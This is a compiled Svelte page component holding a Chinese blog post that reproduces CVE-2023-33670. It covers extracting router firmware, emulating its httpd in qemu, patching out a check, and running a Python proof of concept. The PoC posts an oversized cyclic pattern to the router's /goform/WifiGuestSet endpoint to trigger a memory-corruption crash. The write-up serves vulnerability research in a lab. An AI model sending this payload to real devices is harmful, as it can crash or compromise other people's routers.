import{S as Bs,i as Ns,s as Us,U as We,y as kl,z as wl,A as Cl,V as Ls,W as zs,g as $l,d as Al,B as jl,X as Ss,k as o,q as c,a as r,Y as ra,l as p,m as i,r as f,h as l,c as n,Z as na,n as v,b as t,D as e,E as Rs}from"../chunks/index.cb04554d.js";import{P as Zs}from"../chunks/post_layout.b4692dd9.js";import{I as Ve}from"../chunks/post_card.e679ecb5.js";function Ks(B){let d,u,b,h,F,_,A,j,ql,da,xl,Ua,q,Ol,Fa,zl,La,N,Sl,Ra,x,U,Hl,Za,va,Is=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">  apt-get install qemu-system</span></div><div class='line'><span style="color: undefined">  apt-get install qemu-user-static</span></div></code></div></pre>`,ua,y,Il,Ea,Tl,Vl,ma,Wl,Gl,Ka,P,Ml,_a,Bl,Nl,Qa,ya,Ts=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">  cp $(which qemu-mipsel-static) ./</span></div><div class='line'><span style="color: undefined">  sudo chroot ./ ./qemu-mipsel-static ./bin/httpd</span></div></code></div></pre>`,ba,k,Ul,Da,Ll,Rl,Xa,O,L,Zl,Ya,R,Kl,Ja,Z,z,ga,K,Ql,al,Q,S,ll,w,Xl,ha,Yl,Jl,el,E,gl,Pa,ae,le,ka,ee,se,wa,te,oe,Ca,pe,sl,m,ie,$a,ce,fe,Aa,re,ne,ja,de,Fe,tl,X,ve,ol,Y,H,pl,I,T,ue,qa,Ee,il,xa,Vs=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">sudo brctl addbr br0</span></div><div class='line'><span style="color: undefined">sudo brctl addif br0 eth0 &lt;- [eth0 from your interface on ifconfig]</span></div><div class='line'><span style="color: undefined">sudo ifconfig br0 up</span></div><div class='line'><span style="color: undefined">sudo dhclient br0</span></div></code></div></pre>`,Oa,V,me,za,_e,cl,C,ye,Sa,be,De,fl,W,J,he,rl,Ha,Ws=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> requests</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">host </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">192.168.59.136:80</span><span style="color: #89DDFF">"</span></div><div class='line'><span style="color: #EEFFFF">cyclic </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">b</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaa</span><span style="color: #89DDFF">"</span></div><div class='line'></div><div class='line'><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">exploit_WifiGuestSet</span><span style="color: #89DDFF">():</span></div><div class='line'><span style="color: #EEFFFF">    url </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">f</span><span style="color: #C3E88D">"http://</span><span style="color: #EEFFFF">&#123;host&#125;</span><span style="color: #C3E88D">/goform/WifiGuestSet"</span></div><div class='line'><span style="color: #EEFFFF">    data </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #C792EA">b</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">shareSpeed</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">:</span><span style="color: #EEFFFF">cyclic</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #EEFFFF">    res </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> requests</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">post</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">url</span><span style="color: #89DDFF">=</span><span style="color: #82AAFF">url</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF">data</span><span style="color: #89DDFF">=</span><span style="color: #82AAFF">data</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">res</span><span style="color: #89DDFF">.</span><span style="color: #F07178">content</span><span style="color: #89DDFF">)</span></div><div class='line'></div><div class='line'><span style="color: #82AAFF">exploit_WifiGuestSet</span><span style="color: #89DDFF">()</span></div></code></div></pre>`,Ia,G,g,Pe,nl,aa,ke,dl,la,Ta,we,Fl,ea,Ce,vl,Va,Gs=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">#include &lt;stdio.h&gt;</span></div><div class='line'><span style="color: undefined"></span></div><div class='line'><span style="color: undefined">int main(void) &#123;</span></div><div class='line'><span style="color: undefined">    printf("hello&#92;n");</span></div><div class='line'><span style="color: undefined">    return 0;</span></div><div class='line'><span style="color: undefined">&#125;</span></div></code></div></pre>`,Wa,sa,$e,ul,ta,Ga,Ae,El,oa,je,ml,Ma,Ms=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">$ cp /usr/bin/qemu-mips-static .</span></div><div class='line'><span style="color: undefined">$ qemu-mips-static ./hello</span></div><div class='line'><span style="color: undefined">hello</span></div></code></div></pre>`,Ba,M,pa,qe,_l,ia,ca,xe,Na,Oe,yl;return z=new Ve({props:{src:"./image-20230823195926271.png",alt:"image-20230823195926271"}}),S=new Ve({props:{src:"./image-20230823200528802.png",alt:"image-20230823200528802"}}),H=new Ve({props:{src:"./image-20230823195553164.png",alt:"image-20230823195553164"}}),{c(){d=o("h2"),u=o("a"),b=c("bin 文件的处理"),h=r(),F=o("p"),_=c("使用 binwalk 对 bin 文件进行处理"),A=r(),j=o("p"),ql=c("安装 : "),da=o("code"),xl=c("apt install binwalk"),Ua=r(),q=o("p"),Ol=c("命令 : "),Fa=o("code"),zl=c("binwalk -Me ./*.bin"),La=r(),N=o("p"),Sl=c("解包后即为标准的 unix 文件系统"),Ra=r(),x=o("h2"),U=o("a"),Hl=c("qemu 环境搭建"),Za=r(),va=new ra(!1),ua=r(),y=o("p"),Il=c("以 "),Ea=o("code"),Tl=c("./bin/httpd"),Vl=c(" 为目标，使用"),ma=o("code"),Wl=c("file"),Gl=c("查看信息，LSB 选择 mipsel"),Ka=r(),P=o("p"),Ml=c("进入到解包后的"),_a=o("strong"),Bl=c("*bin/extracted/squashfs-root/"),Nl=c("目录下"),Qa=r(),ya=new ra(!1),ba=r(),k=o("p"),Ul=c("启动"),Da=o("strong"),Ll=c("目标 httpd"),Rl=c("，由于存在检查，失败"),Xa=r(),O=o("h2"),L=o("a"),Zl=c("修补程序，去掉 check"),Ya=r(),R=o("p"),Kl=c("Patch 前："),Ja=r(),Z=o("p"),kl(z.$$.fragment),ga=r(),K=o("p"),Ql=c("使用 IDAPro 进行 Patch"),al=r(),Q=o("p"),kl(S.$$.fragment),ll=r(),w=o("p"),Xl=c("通过搜索"),ha=o("strong"),Yl=c("Welcome"),Jl=c("关键字，找到程序中断点，"),el=r(),E=o("p"),gl=c("切换到图模式，可以确认在 "),Pa=o("code"),ae=c("bgez"),le=c(" 处进行判断，只需要将原来的 "),ka=o("code"),ee=c(">="),se=c(" 修改即可，也就是将 "),wa=o("code"),te=c("bgez"),oe=c(" 改为 "),Ca=o("code"),pe=c("bltz"),sl=r(),m=o("p"),ie=c("在 "),$a=o("code"),ce=c("Edit -> Patch program -> Change byte"),fe=c("中 将"),Aa=o("code"),re=c("0A 00 41 04"),ne=c("改为"),ja=o("code"),de=c("0A 00 01 04"),Fe=c(" 即可"),tl=r(),X=o("p"),ve=c("Patch 后："),ol=r(),Y=o("p"),kl(H.$$.fragment),pl=r(),I=o("h2"),T=o("a"),ue=c("创建 "),qa=o("code"),Ee=c("bridge"),il=r(),xa=new ra(!1),Oa=r(),V=o("p"),me=c("如出现"),za=o("code"),_e=c("Unsupported setsockopt level=65535 optname=128"),cl=r(),C=o("p"),ye=c("执行 "),Sa=o("code"),be=c("cp -rf ./webroot_ro/* ./var/webroot/"),De=c(" 即可正常运行"),fl=r(),W=o("h2"),J=o("a"),he=c("使用 Poc 攻击"),rl=r(),Ha=new ra(!1),Ia=r(),G=o("h2"),g=o("a"),Pe=c("MIPS 编译测试"),nl=r(),aa=o("p"),ke=c("安装编译器"),dl=r(),la=o("p"),Ta=o("code"),we=c("sudo apt-get install gcc-mips-linux-gnu"),Fl=r(),ea=o("p"),Ce=c("使用下面代码测试"),vl=r(),Va=new ra(!1),Wa=r(),sa=o("p"),$e=c("编译"),ul=r(),ta=o("p"),Ga=o("code"),Ae=c("mips-linux-gnu-gcc -static hello.c -o hello"),El=r(),oa=o("p"),je=c("运行结果"),ml=r(),Ma=new ra(!1),Ba=r(),M=o("h2"),pa=o("a"),qe=c("照猫画虎"),_l=r(),ia=o("blockquote"),ca=o("p"),xe=c("拿到了第一个 CVE 编号 "),Na=o("code"),Oe=c("CVE-2023-42320"),this.h()},l(a){d=p(a,"H2",{id:!0});var s=i(d);u=p(s,"A",{href:!0});var Ge=i(u);b=f(Ge,"bin 文件的处理"),Ge.forEach(l),s.forEach(l),h=n(a),F=p(a,"P",{});var Me=i(F);_=f(Me,"使用 binwalk 对 bin 文件进行处理"),Me.forEach(l),A=n(a),j=p(a,"P",{});var ze=i(j);ql=f(ze,"安装 : "),da=p(ze,"CODE",{});var Be=i(da);xl=f(Be,"apt install binwalk"),Be.forEach(l),ze.forEach(l),Ua=n(a),q=p(a,"P",{});var Se=i(q);Ol=f(Se,"命令 : "),Fa=p(Se,"CODE",{});var Ne=i(Fa);zl=f(Ne,"binwalk -Me ./*.bin"),Ne.forEach(l),Se.forEach(l),La=n(a),N=p(a,"P",{});var Ue=i(N);Sl=f(Ue,"解包后即为标准的 unix 文件系统"),Ue.forEach(l),Ra=n(a),x=p(a,"H2",{id:!0});var Le=i(x);U=p(Le,"A",{href:!0});var Re=i(U);Hl=f(Re,"qemu 环境搭建"),Re.forEach(l),Le.forEach(l),Za=n(a),va=na(a,!1),ua=n(a),y=p(a,"P",{});var fa=i(y);Il=f(fa,"以 "),Ea=p(fa,"CODE",{});var Ze=i(Ea);Tl=f(Ze,"./bin/httpd"),Ze.forEach(l),Vl=f(fa," 为目标，使用"),ma=p(fa,"CODE",{});var Ke=i(ma);Wl=f(Ke,"file"),Ke.forEach(l),Gl=f(fa,"查看信息，LSB 选择 mipsel"),fa.forEach(l),Ka=n(a),P=p(a,"P",{});var bl=i(P);Ml=f(bl,"进入到解包后的"),_a=p(bl,"STRONG",{});var Qe=i(_a);Bl=f(Qe,"*bin/extracted/squashfs-root/"),Qe.forEach(l),Nl=f(bl,"目录下"),bl.forEach(l),Qa=n(a),ya=na(a,!1),ba=n(a),k=p(a,"P",{});var Dl=i(k);Ul=f(Dl,"启动"),Da=p(Dl,"STRONG",{});var Xe=i(Da);Ll=f(Xe,"目标 httpd"),Xe.forEach(l),Rl=f(Dl,"，由于存在检查，失败"),Dl.forEach(l),Xa=n(a),O=p(a,"H2",{id:!0});var Ye=i(O);L=p(Ye,"A",{href:!0});var Je=i(L);Zl=f(Je,"修补程序，去掉 check"),Je.forEach(l),Ye.forEach(l),Ya=n(a),R=p(a,"P",{});var ge=i(R);Kl=f(ge,"Patch 前："),ge.forEach(l),Ja=n(a),Z=p(a,"P",{});var as=i(Z);wl(z.$$.fragment,as),as.forEach(l),ga=n(a),K=p(a,"P",{});var ls=i(K);Ql=f(ls,"使用 IDAPro 进行 Patch"),ls.forEach(l),al=n(a),Q=p(a,"P",{});var es=i(Q);wl(S.$$.fragment,es),es.forEach(l),ll=n(a),w=p(a,"P",{});var hl=i(w);Xl=f(hl,"通过搜索"),ha=p(hl,"STRONG",{});var ss=i(ha);Yl=f(ss,"Welcome"),ss.forEach(l),Jl=f(hl,"关键字，找到程序中断点，"),hl.forEach(l),el=n(a),E=p(a,"P",{});var D=i(E);gl=f(D,"切换到图模式，可以确认在 "),Pa=p(D,"CODE",{});var ts=i(Pa);ae=f(ts,"bgez"),ts.forEach(l),le=f(D," 处进行判断，只需要将原来的 "),ka=p(D,"CODE",{});var os=i(ka);ee=f(os,">="),os.forEach(l),se=f(D," 修改即可，也就是将 "),wa=p(D,"CODE",{});var ps=i(wa);te=f(ps,"bgez"),ps.forEach(l),oe=f(D," 改为 "),Ca=p(D,"CODE",{});var is=i(Ca);pe=f(is,"bltz"),is.forEach(l),D.forEach(l),sl=n(a),m=p(a,"P",{});var $=i(m);ie=f($,"在 "),$a=p($,"CODE",{});var cs=i($a);ce=f(cs,"Edit -> Patch program -> Change byte"),cs.forEach(l),fe=f($,"中 将"),Aa=p($,"CODE",{});var fs=i(Aa);re=f(fs,"0A 00 41 04"),fs.forEach(l),ne=f($,"改为"),ja=p($,"CODE",{});var rs=i(ja);de=f(rs,"0A 00 01 04"),rs.forEach(l),Fe=f($," 即可"),$.forEach(l),tl=n(a),X=p(a,"P",{});var ns=i(X);ve=f(ns,"Patch 后："),ns.forEach(l),ol=n(a),Y=p(a,"P",{});var ds=i(Y);wl(H.$$.fragment,ds),ds.forEach(l),pl=n(a),I=p(a,"H2",{id:!0});var Fs=i(I);T=p(Fs,"A",{href:!0});var He=i(T);ue=f(He,"创建 "),qa=p(He,"CODE",{});var vs=i(qa);Ee=f(vs,"bridge"),vs.forEach(l),He.forEach(l),Fs.forEach(l),il=n(a),xa=na(a,!1),Oa=n(a),V=p(a,"P",{});var Ie=i(V);me=f(Ie,"如出现"),za=p(Ie,"CODE",{});var us=i(za);_e=f(us,"Unsupported setsockopt level=65535 optname=128"),us.forEach(l),Ie.forEach(l),cl=n(a),C=p(a,"P",{});var Pl=i(C);ye=f(Pl,"执行 "),Sa=p(Pl,"CODE",{});var Es=i(Sa);be=f(Es,"cp -rf ./webroot_ro/* ./var/webroot/"),Es.forEach(l),De=f(Pl," 即可正常运行"),Pl.forEach(l),fl=n(a),W=p(a,"H2",{id:!0});var ms=i(W);J=p(ms,"A",{href:!0});var _s=i(J);he=f(_s,"使用 Poc 攻击"),_s.forEach(l),ms.forEach(l),rl=n(a),Ha=na(a,!1),Ia=n(a),G=p(a,"H2",{id:!0});var ys=i(G);g=p(ys,"A",{href:!0});var bs=i(g);Pe=f(bs,"MIPS 编译测试"),bs.forEach(l),ys.forEach(l),nl=n(a),aa=p(a,"P",{});var Ds=i(aa);ke=f(Ds,"安装编译器"),Ds.forEach(l),dl=n(a),la=p(a,"P",{});var hs=i(la);Ta=p(hs,"CODE",{});var Ps=i(Ta);we=f(Ps,"sudo apt-get install gcc-mips-linux-gnu"),Ps.forEach(l),hs.forEach(l),Fl=n(a),ea=p(a,"P",{});var ks=i(ea);Ce=f(ks,"使用下面代码测试"),ks.forEach(l),vl=n(a),Va=na(a,!1),Wa=n(a),sa=p(a,"P",{});var ws=i(sa);$e=f(ws,"编译"),ws.forEach(l),ul=n(a),ta=p(a,"P",{});var Cs=i(ta);Ga=p(Cs,"CODE",{});var $s=i(Ga);Ae=f($s,"mips-linux-gnu-gcc -static hello.c -o hello"),$s.forEach(l),Cs.forEach(l),El=n(a),oa=p(a,"P",{});var As=i(oa);je=f(As,"运行结果"),As.forEach(l),ml=n(a),Ma=na(a,!1),Ba=n(a),M=p(a,"H2",{id:!0});var js=i(M);pa=p(js,"A",{href:!0});var qs=i(pa);qe=f(qs,"照猫画虎"),qs.forEach(l),js.forEach(l),_l=n(a),ia=p(a,"BLOCKQUOTE",{});var xs=i(ia);ca=p(xs,"P",{});var Te=i(ca);xe=f(Te,"拿到了第一个 CVE 编号 "),Na=p(Te,"CODE",{});var Os=i(Na);Oe=f(Os,"CVE-2023-42320"),Os.forEach(l),Te.forEach(l),xs.forEach(l),this.h()},h(){v(u,"href","#bin-文件的处理"),v(d,"id","bin-文件的处理"),v(U,"href","#qemu-环境搭建"),v(x,"id","qemu-环境搭建"),va.a=ua,ya.a=ba,v(L,"href","#修补程序去掉-check"),v(O,"id","修补程序去掉-check"),v(T,"href","#创建-bridge"),v(I,"id","创建-bridge"),xa.a=Oa,v(J,"href","#使用-poc-攻击"),v(W,"id","使用-poc-攻击"),Ha.a=Ia,v(g,"href","#mips-编译测试"),v(G,"id","mips-编译测试"),Va.a=Wa,Ma.a=Ba,v(pa,"href","#照猫画虎"),v(M,"id","照猫画虎")},m(a,s){t(a,d,s),e(d,u),e(u,b),t(a,h,s),t(a,F,s),e(F,_),t(a,A,s),t(a,j,s),e(j,ql),e(j,da),e(da,xl),t(a,Ua,s),t(a,q,s),e(q,Ol),e(q,Fa),e(Fa,zl),t(a,La,s),t(a,N,s),e(N,Sl),t(a,Ra,s),t(a,x,s),e(x,U),e(U,Hl),t(a,Za,s),va.m(Is,a,s),t(a,ua,s),t(a,y,s),e(y,Il),e(y,Ea),e(Ea,Tl),e(y,Vl),e(y,ma),e(ma,Wl),e(y,Gl),t(a,Ka,s),t(a,P,s),e(P,Ml),e(P,_a),e(_a,Bl),e(P,Nl),t(a,Qa,s),ya.m(Ts,a,s),t(a,ba,s),t(a,k,s),e(k,Ul),e(k,Da),e(Da,Ll),e(k,Rl),t(a,Xa,s),t(a,O,s),e(O,L),e(L,Zl),t(a,Ya,s),t(a,R,s),e(R,Kl),t(a,Ja,s),t(a,Z,s),Cl(z,Z,null),t(a,ga,s),t(a,K,s),e(K,Ql),t(a,al,s),t(a,Q,s),Cl(S,Q,null),t(a,ll,s),t(a,w,s),e(w,Xl),e(w,ha),e(ha,Yl),e(w,Jl),t(a,el,s),t(a,E,s),e(E,gl),e(E,Pa),e(Pa,ae),e(E,le),e(E,ka),e(ka,ee),e(E,se),e(E,wa),e(wa,te),e(E,oe),e(E,Ca),e(Ca,pe),t(a,sl,s),t(a,m,s),e(m,ie),e(m,$a),e($a,ce),e(m,fe),e(m,Aa),e(Aa,re),e(m,ne),e(m,ja),e(ja,de),e(m,Fe),t(a,tl,s),t(a,X,s),e(X,ve),t(a,ol,s),t(a,Y,s),Cl(H,Y,null),t(a,pl,s),t(a,I,s),e(I,T),e(T,ue),e(T,qa),e(qa,Ee),t(a,il,s),xa.m(Vs,a,s),t(a,Oa,s),t(a,V,s),e(V,me),e(V,za),e(za,_e),t(a,cl,s),t(a,C,s),e(C,ye),e(C,Sa),e(Sa,be),e(C,De),t(a,fl,s),t(a,W,s),e(W,J),e(J,he),t(a,rl,s),Ha.m(Ws,a,s),t(a,Ia,s),t(a,G,s),e(G,g),e(g,Pe),t(a,nl,s),t(a,aa,s),e(aa,ke),t(a,dl,s),t(a,la,s),e(la,Ta),e(Ta,we),t(a,Fl,s),t(a,ea,s),e(ea,Ce),t(a,vl,s),Va.m(Gs,a,s),t(a,Wa,s),t(a,sa,s),e(sa,$e),t(a,ul,s),t(a,ta,s),e(ta,Ga),e(Ga,Ae),t(a,El,s),t(a,oa,s),e(oa,je),t(a,ml,s),Ma.m(Ms,a,s),t(a,Ba,s),t(a,M,s),e(M,pa),e(pa,qe),t(a,_l,s),t(a,ia,s),e(ia,ca),e(ca,xe),e(ca,Na),e(Na,Oe),yl=!0},p:Rs,i(a){yl||($l(z.$$.fragment,a),$l(S.$$.fragment,a),$l(H.$$.fragment,a),yl=!0)},o(a){Al(z.$$.fragment,a),Al(S.$$.fragment,a),Al(H.$$.fragment,a),yl=!1},d(a){a&&l(d),a&&l(h),a&&l(F),a&&l(A),a&&l(j),a&&l(Ua),a&&l(q),a&&l(La),a&&l(N),a&&l(Ra),a&&l(x),a&&l(Za),a&&va.d(),a&&l(ua),a&&l(y),a&&l(Ka),a&&l(P),a&&l(Qa),a&&ya.d(),a&&l(ba),a&&l(k),a&&l(Xa),a&&l(O),a&&l(Ya),a&&l(R),a&&l(Ja),a&&l(Z),jl(z),a&&l(ga),a&&l(K),a&&l(al),a&&l(Q),jl(S),a&&l(ll),a&&l(w),a&&l(el),a&&l(E),a&&l(sl),a&&l(m),a&&l(tl),a&&l(X),a&&l(ol),a&&l(Y),jl(H),a&&l(pl),a&&l(I),a&&l(il),a&&xa.d(),a&&l(Oa),a&&l(V),a&&l(cl),a&&l(C),a&&l(fl),a&&l(W),a&&l(rl),a&&Ha.d(),a&&l(Ia),a&&l(G),a&&l(nl),a&&l(aa),a&&l(dl),a&&l(la),a&&l(Fl),a&&l(ea),a&&l(vl),a&&Va.d(),a&&l(Wa),a&&l(sa),a&&l(ul),a&&l(ta),a&&l(El),a&&l(oa),a&&l(ml),a&&Ma.d(),a&&l(Ba),a&&l(M),a&&l(_l),a&&l(ia)}}}function Qs(B){let d,u;const b=[B[0],Hs];let h={$$slots:{default:[Ks]},$$scope:{ctx:B}};for(let F=0;F<b.length;F+=1)h=We(h,b[F]);return d=new Zs({props:h}),{c(){kl(d.$$.fragment)},l(F){wl(d.$$.fragment,F)},m(F,_){Cl(d,F,_),u=!0},p(F,[_]){const A=_&1?Ls(b,[_&1&&zs(F[0]),_&0&&zs(Hs)]):{};_&2&&(A.$$scope={dirty:_,ctx:F}),d.$set(A)},i(F){u||($l(d.$$.fragment,F),u=!0)},o(F){Al(d.$$.fragment,F),u=!1},d(F){jl(d,F)}}}const Hs={title:"CVE-2023-33670 复现",image:"/20230823/penup.webp",alt:"Az",created:"2023-08-23T00:00:00.000Z",updated:"2023-09-19T00:00:00.000Z",summary:"以及自己的第一个 CVE 编号",tags:["PWN"],images:[],slug:"/20230823/+page.svelte.md",path:"/20230823",toc:[{depth:2,title:"bin 文件的处理",slug:"bin-文件的处理"},{depth:2,title:"qemu 环境搭建",slug:"qemu-环境搭建"},{depth:2,title:"修补程序，去掉 check",slug:"修补程序去掉-check"},{depth:2,title:"创建 bridge",slug:"创建-bridge"},{depth:2,title:"使用 Poc 攻击",slug:"使用-poc-攻击"},{depth:2,title:"MIPS 编译测试",slug:"mips-编译测试"},{depth:2,title:"照猫画虎",slug:"照猫画虎"}]};function Xs(B,d,u){return B.$$set=b=>{u(0,d=We(We({},d),Ss(b)))},d=Ss(d),[d]}class at extends Bs{constructor(d){super(),Ns(this,d,Xs,Qs,Us,{})}}export{at as component};
